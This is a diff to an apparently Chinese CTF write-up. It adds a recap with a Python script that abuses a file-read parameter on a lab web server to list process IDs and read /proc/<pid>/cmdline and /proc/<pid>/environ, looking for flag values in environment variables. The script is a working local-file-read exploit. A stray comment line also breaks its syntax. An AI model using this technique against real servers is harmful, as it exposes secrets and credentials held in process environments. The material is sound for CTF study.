@@ -135,3 +135,23 @@ server {
     }
 }
 ```
+
+回顾：
+借助scdyh的wp获取env和cmdline
+```python
+import requests
+url = "http://192.168.32.230/index.php"
+pids_raw = requests.get(f"{url}?action=list").text.strip().split('\n')
+for pid_path in pids_raw:
+   pid = pid_path.split('/')[-1]
+   # 尝试读取该进程的 cmdline
+   cmd = requests.get(f"{url}?file=/proc/{pid}/cmdline").text
+   # 尝试读取该进程的环境变量
+分别去读一下
+   env = requests.get(f"{url}?file=/proc/{pid}/environ").text
+   if cmd and "Error" not in cmd:
+       print(f"--- PID {pid} ---")
+       print(f"CMD: {cmd.replace('', ' ')}")
+       if "514" in env or "FLAG" in env or "hint" in env:
+           print(f"ENV: {env}")
+```
